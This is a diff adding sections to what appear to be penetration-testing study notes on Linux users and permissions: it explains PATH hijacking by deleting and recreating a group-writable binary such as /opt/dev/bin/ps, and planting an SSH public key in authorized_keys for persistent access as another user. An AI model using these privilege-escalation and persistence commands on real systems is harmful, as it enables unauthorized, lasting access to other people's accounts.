@@ -54,3 +54,33 @@ Group ID (GID): The primary group ID (stored in /etc/group file)
 User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
 Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
 Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.
+
+# Group Write vs Ownership
+
+Being in a group that grants write access to a file lets you modify its **content**, but NOT change its **permissions** or **ownership**. Only the file owner (or root) can `chmod` or `chown`.
+
+This matters for PATH hijacks: if a file in a privileged PATH directory is group-writable but not executable, you can change what's inside it but can't make it executable unless you're the owner. The workaround is to delete the file (requires write on the **directory**) and create a new one — the new file is owned by you, so you can chmod it.
+
+```bash
+# You're in dev_user group, file is group-writable but you don't own it
+echo '#!/bin/bash' > /opt/dev/bin/ps    # works (group write)
+chmod +x /opt/dev/bin/ps                 # FAILS (not owner)
+
+# If you have write on the PARENT directory, delete and recreate
+rm /opt/dev/bin/ps                       # works (dir write)
+echo '#!/bin/bash' > /opt/dev/bin/ps     # new file, YOU own it
+chmod +x /opt/dev/bin/ps                 # works (you're the owner now)
+```
+
+# SSH Key Planting
+
+When you can execute commands as another user (via cron, PATH hijack, writable script, etc.) but can't get an interactive shell directly, planting an SSH public key gives you stable, persistent access.
+
+```bash
+mkdir -p $HOME/.ssh
+chmod 700 $HOME/.ssh
+echo "ssh-rsa AAAA..." > $HOME/.ssh/authorized_keys
+chmod 600 $HOME/.ssh/authorized_keys
+```
+
+**StrictModes trap:** OpenSSH refuses key auth if `.ssh/` is group or world writable, or if `authorized_keys` has wrong permissions. Always set `chmod 700` on the directory and `chmod 600` on the file. If the script runs under a permissive umask, files get created with loose permissions and SSH silently rejects the key — no error message, just "Permission denied."
